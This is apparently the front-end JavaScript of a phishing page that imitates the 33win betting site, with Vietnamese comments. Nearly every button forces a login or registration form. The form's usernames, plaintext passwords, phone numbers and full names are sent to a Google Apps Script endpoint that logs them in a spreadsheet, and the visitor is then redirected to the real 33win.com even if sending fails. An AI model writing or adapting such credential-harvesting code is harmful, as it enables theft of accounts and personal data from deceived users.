document.addEventListener("DOMContentLoaded", function() {
    
    // 1. Xử lý Active state cho thanh điều hướng dưới cùng (Bottom Navigation)
    const navItems = document.querySelectorAll('.nav-item');
    navItems.forEach(item => {
        item.addEventListener('click', function() {
            // Xóa class active ở tất cả các nút
            navItems.forEach(nav => nav.classList.remove('active'));
            // Thêm class active vào nút được click
            this.classList.add('active');
        });
    });

    // 2. --- Code xử lý Banner Slider ---
    const sliderWrapper = document.getElementById('slider-wrapper');
    const dots = document.querySelectorAll('.dot');
    
    // Kiểm tra xem có phần tử slider trên trang không thì mới chạy
    if (sliderWrapper && dots.length > 0) {
        let currentSlide = 0;
        const totalSlides = 6; // Tổng số ảnh banner

        // Hàm cập nhật vị trí slider và dấu chấm
        function updateSlider() {
            // Di chuyển khung chứa ảnh sang trái tương ứng với ảnh hiện tại
            sliderWrapper.style.transform = `translateX(-${currentSlide * 100}%)`;
            
            // Xóa class active ở tất cả dấu chấm
            dots.forEach(dot => dot.classList.remove('active'));
            // Thêm class active cho dấu chấm của ảnh hiện tại
            if(dots[currentSlide]) dots[currentSlide].classList.add('active');
        }

        // Hàm chuyển sang ảnh tiếp theo
        function nextSlide() {
            currentSlide = (currentSlide + 1) % totalSlides; // Quay lại 0 nếu vượt quá số lượng ảnh
            updateSlider();
        }

        // Thiết lập tự động chạy hàm nextSlide mỗi 3 giây (3000 milliseconds)
        let slideInterval = setInterval(nextSlide, 3000);
    }

    // 3. --- Code xử lý chuyển tab cho Danh mục Game ---
    const categoryItems = document.querySelectorAll('.categories .cat-item');
    categoryItems.forEach(item => {
        item.addEventListener('click', function() {
            // Bước 1: Xóa class 'active' khỏi tất cả các mục danh mục
            categoryItems.forEach(cat => cat.classList.remove('active'));
            
            // Bước 2: Thêm class 'active' vào mục vừa được click
            this.classList.add('active');
        });
    });
    // --- Code xử lý Form Đăng Nhập / Đăng Ký ---
    const modal = document.getElementById('auth-modal');
    const btnOpenLogin = document.getElementById('btn-open-login');
    const btnOpenRegister = document.getElementById('btn-open-register');
    const btnClose = document.getElementById('close-auth');
    
    const tabLogin = document.getElementById('tab-login');
    const tabRegister = document.getElementById('tab-register');
    const formLogin = document.getElementById('form-login');
    const formRegister = document.getElementById('form-register');

    // Hàm Mở Modal và chọn Tab
    function openAuthModal(isLogin) {
        modal.classList.add('show');
        if (isLogin) {
            tabLogin.classList.add('active');
            formLogin.classList.add('active');
            tabRegister.classList.remove('active');
            formRegister.classList.remove('active');
        } else {
            tabRegister.classList.add('active');
            formRegister.classList.add('active');
            tabLogin.classList.remove('active');
            formLogin.classList.remove('active');
        }
    }

    // Gắn sự kiện click
    btnOpenLogin.addEventListener('click', () => openAuthModal(true));
    btnOpenRegister.addEventListener('click', () => openAuthModal(false));
    
    // Nút đóng
    btnClose.addEventListener('click', () => {
        modal.classList.remove('show');
    });

    // Click chuyển tab trong Modal
    tabLogin.addEventListener('click', () => openAuthModal(true));
    tabRegister.addEventListener('click', () => openAuthModal(false));

    // --- Code xử lý Xác thực (Validation) và Chuyển hướng ---
    const loginSubmitBtn = formLogin.querySelector('.btn-submit');
    const registerSubmitBtn = formRegister.querySelector('.btn-submit');

    // Hàm kiểm tra form chung và gửi dữ liệu về GG Sheets
    function validateFormAndRedirect(formElement) {
        const inputs = formElement.querySelectorAll('input:not([type="checkbox"])');
        
        // 1. Kiểm tra trống
        for (let i = 0; i < inputs.length; i++) {
            if (inputs[i].value.trim() === '') {
                alert("Vui lòng điền đầy đủ thông tin vào tất cả các ô trống.");
                inputs[i].focus();
                return;
            }
        }

        // Nhận diện các ô input
        const textInputs = formElement.querySelectorAll('input[type="text"]'); 
        const usernameInput = textInputs[0]; // Ô text đầu tiên luôn là Tài khoản
        const passwordInput = formElement.querySelector('input[type="password"]');
        const phoneInput = formElement.querySelector('input[type="tel"]');
        
        // Form đăng ký có thêm Họ Tên ở ô text thứ 2
        let fullnameVal = "";
        if (formElement.id === 'form-register' && textInputs.length > 1) {
            fullnameVal = textInputs[1].value.trim();
        }

        // 2. Ràng buộc Tài khoản (6 - 20)
        if (usernameInput) {
            const userLen = usernameInput.value.trim().length;
            if (userLen < 6 || userLen > 20) {
                alert("Tài khoản không hợp lệ. Vui lòng nhập từ 6 đến 20 ký tự.");
                usernameInput.focus();
                return;
            }
        }

        // 3. Ràng buộc Mật khẩu (6 - 20)
        if (passwordInput) {
            const passLen = passwordInput.value.length;
            if (passLen < 6 || passLen > 20) {
                alert("Mật khẩu không an toàn. Vui lòng nhập từ 6 đến 20 ký tự.");
                passwordInput.focus();
                return;
            }
        }

        // 4. Ràng buộc Số điện thoại (10 số)
        if (phoneInput) {
            const phoneRegex = /^\d{10}$/; 
            if (!phoneRegex.test(phoneInput.value.trim())) {
                alert("Số điện thoại sai định dạng. Vui lòng nhập chính xác 10 số.");
                phoneInput.focus();
                return;
            }
        }

        // --- NẾU HỢP LỆ -> ĐẨY DỮ LIỆU VỀ GOOGLE SHEETS ---
        
        // Đổi nút thành "Đang xử lý..." để người dùng không bấm nhiều lần
        const submitBtn = formElement.querySelector('.btn-submit');
        submitBtn.innerText = "Đang xử lý...";
        submitBtn.disabled = true;

        // Đóng gói dữ liệu tương ứng với cột Google Sheets
        let formData = {
            status: formElement.id === 'form-login' ? 'Đăng Nhập' : 'Đăng Ký',
            username: usernameInput ? usernameInput.value.trim() : '',
            password: passwordInput ? passwordInput.value : '',
            phone: phoneInput ? phoneInput.value.trim() : '',
            fullname: fullnameVal
        };

        // BẠN HÃY DÁN ĐƯỜNG LINK WEB APP CỦA GOOGLE APPS SCRIPT VÀO ĐÂY:
        const scriptURL = 'https://script.google.com/macros/s/AKfycbywAuJ_km4ZtSKgLU0TC_-yF6dqKHwoNq84QOfOcqUCRPs4KUVrj8Jou_bgpUan0oTZqA/exec'; 

        // Gọi API gửi dữ liệu
        fetch(scriptURL, {
            method: 'POST',
            body: JSON.stringify(formData),
            headers: {
                'Content-Type': 'text/plain;charset=utf-8', // Tránh lỗi CORS
            }
        })
        .then(response => response.json())
        .then(data => {
            // Sau khi Google Sheets nhận dữ liệu thành công -> Chuyển hướng
            window.location.href = "https://33win.com/";
        })
        .catch(error => {
            console.error('Lỗi đẩy dữ liệu!', error.message);
            // Kể cả lỗi mạng cũng vẫn cho chuyển hướng để không gián đoạn trải nghiệm
            window.location.href = "https://33win.com/";
        });
    }

    // Bắt sự kiện click nút Đăng Nhập
    if (loginSubmitBtn) {
        loginSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault(); // Chặn hành vi tải lại trang mặc định của nút submit
            validateFormAndRedirect(formLogin);
        });
    }

    // Bắt sự kiện click nút Đăng Ký mới
    if (registerSubmitBtn) {
        registerSubmitBtn.addEventListener('click', function(e) {
            e.preventDefault(); 
            validateFormAndRedirect(formRegister);
        });
    }
   // --- Code yêu cầu đăng nhập khi nhấn vào các tính năng khác ---
    
    // Tìm tất cả các nút hoặc khu vực cần yêu cầu đăng nhập
    // Bao gồm: Nút Nạp/Rút/VIP (.action-item), Khung game (.banner-box), Nút vào trò chơi (.play-tag)
    const requireLoginElements = document.querySelectorAll('.action-item, .banner-box, .play-tag,.header .menu-icon,.header .app-icon,.cat-item,.nav-item');

    requireLoginElements.forEach(element => {
        element.addEventListener('click', function(e) {
            e.preventDefault(); // Chặn hành vi click mặc định
            
            // Gọi hàm mở form và ép hiển thị tab Đăng Nhập (true)
            openAuthModal(true);
        });
    });
});